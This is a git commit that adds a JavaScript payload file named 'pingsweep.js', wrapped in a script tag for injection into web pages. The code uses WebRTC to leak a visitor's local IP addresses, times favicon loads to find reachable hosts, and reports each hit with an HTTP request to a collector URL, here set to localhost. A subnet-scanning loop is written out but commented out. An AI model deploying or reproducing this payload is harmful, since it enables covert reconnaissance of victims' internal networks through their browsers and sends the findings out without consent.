360a994864e14963ed4fdaa9ab89ddf2e542f4e0
Matthias Altmann <secf00tprint@gmail.com>
2020-02-14 22:47:30 +0100

    add pingsweep

---
+++ payloads/pingsweep.js
@@ -0,0 +1,164 @@
+<script>
+
+/**
+ * With the help of: https://github.com/alfg/ping.js/ and http://net.ipcalf.com/
+ *
+ * Checks local IPs and scans found ip x.y.z.k in the range x.y.[z+-1].[1-254]
+ *
+ * Creates a Ping instance.
+ * @returns {Ping}
+ * @constructor
+ */
+var Ping = function(opt) {
+    this.opt = opt || {};
+    this.favicon = this.opt.favicon || "/favicon.ico";
+    this.timeout = this.opt.timeout || 0;
+    this.logError = this.opt.logError || false;
+};
+
+/**
+ * Pings source and triggers a callback when completed.
+ * @param source Source of the website or server, including protocol and port.
+ * @param callback Callback function to trigger when completed. Returns error and ping value.
+ * @param timeout Optional number of milliseconds to wait before aborting.
+ */
+Ping.prototype.ping = function(target, callback) {
+    source = "http://"+target;
+    var self = this;
+    self.wasSuccess = false;
+    self.img = new Image();
+    self.img.onload = onload;
+    self.img.onerror = onerror;
+
+    var timer;
+    var start = new Date();
+
+    function onload(e) {
+        self.wasSuccess = true;
+        pingCheck.call(self, e);
+    }
+
+    function onerror(e) {
+        self.wasSuccess = false;
+        pingCheck.call(self, e);
+    }
+
+    if (self.timeout) {
+        timer = setTimeout(function() {
+            pingCheck.call(self, undefined);
+        }, self.timeout); }
+
+
+    /**
+     * Times ping and triggers callback.
+     */
+    function pingCheck() {
+        if (timer) { clearTimeout(timer); }
+        var pong = new Date() - start;
+
+        if (typeof callback === "function") {
+            // When operating in timeout mode, the timeout callback doesn't pass [event] as e.
+            // Notice [this] instead of [self], since .call() was used with context
+            if (!this.wasSuccess) {
+                if (self.logError) { console.error("error loading resource"); }
+                return callback("error", pong, target);
+            }
+            return callback(null, pong, target);
+        }
+    }
+
+    self.img.src = source + self.favicon + "?" + (+new Date()); // Trigger image load with cache buster
+};
+
+// NOTE: window.RTCPeerConnection is "not a constructor" in FF22/23
+var RTCPeerConnection = /*window.RTCPeerConnection ||*/ window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+
+if (RTCPeerConnection) (function () {
+    var rtc = new RTCPeerConnection({iceServers:[]});
+    if (1 || window.mozRTCPeerConnection) {      // FF [and now Chrome!] needs a channel/stream to proceed
+        rtc.createDataChannel('', {reliable:false});
+    };
+
+    rtc.onicecandidate = function (evt) {
+        // convert the candidate to SDP so we can run it through our general parser
+        // see https://twitter.com/lancestout/status/525796175425720320 for details
+        if (evt.candidate) grepSDP("a="+evt.candidate.candidate);
+    };
+    rtc.createOffer(function (offerDesc) {
+        grepSDP(offerDesc.sdp);
+        rtc.setLocalDescription(offerDesc);
+    }, function (e) { console.warn("offer failed", e); });
+
+
+    var addrs = Object.create(null);
+    addrs["0.0.0.0"] = false;
+    function updateIPs(newAddr) {
+        if (newAddr in addrs) return;
+        else addrs[newAddr] = true;
+        var displayAddrs = Object.keys(addrs).filter(function (k) { return addrs[k]; });
+        checkIP(newAddr);
+    }
+
+    function grepSDP(sdp) {
+        var hosts = [];
+        sdp.split('\r\n').forEach(function (line) { // c.f. http://tools.ietf.org/html/rfc4566#page-39
+            if (~line.indexOf("a=candidate")) {     // http://tools.ietf.org/html/rfc4566#section-5.13
+                var parts = line.split(' '),        // http://tools.ietf.org/html/rfc5245#section-15.1
+                    addr = parts[4],
+                    type = parts[7];
+                if (type === 'host') updateIPs(addr);
+            } else if (~line.indexOf("c=")) {       // http://tools.ietf.org/html/rfc4566#section-5.7
+                var parts = line.split(' '),
+                    addr = parts[2];
+                updateIPs(addr);
+            }
+        });
+    }
+})();
+
+function httpGet(theUrl)
+{
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
+    xmlHttp.send( null );
+    return xmlHttp.responseText;
+}
+
+function checkIP(ip)
+{
+ /*   var prefix_ip = "";
+    var net_ips = [];
+    var targets = [];
+    net_ips.push(parseInt(ip.split(".")[2]));
+    if (net_ips[0] > 0) {
+        net_ips.push(net_ips[0] - 1);
+    }
+    if (net_ips[0] < 255) {
+        net_ips.push(net_ips[0] + 1);
+    }
+    for (var i = 0; i < 2; i++) {
+        prefix_ip = prefix_ip + ip.split(".")[i] + ".";
+    }
+
+    for (var j = 0; j < net_ips.length; j++) {
+        for (var ip = 1; ip < 254; ip++) {
+            targets.push(prefix_ip + net_ips[j].toString() + "." + ip.toString());
+        }
+    }
+*/
+    var targets = [];
+    targets.push("github.com");
+    for (var i = 0; i < targets.length; i++) {
+        var p = new Ping();
+        p.ping(targets[i], function (err, pong, target) {
+            if (!err) {
+                if (pong) {
+                    httpGet("http://localhost/ip?"+target);
+                    // console.log(target + " " + pong + " reachable");
+                }
+            }
+        });
+    }
+}
+
+</script>
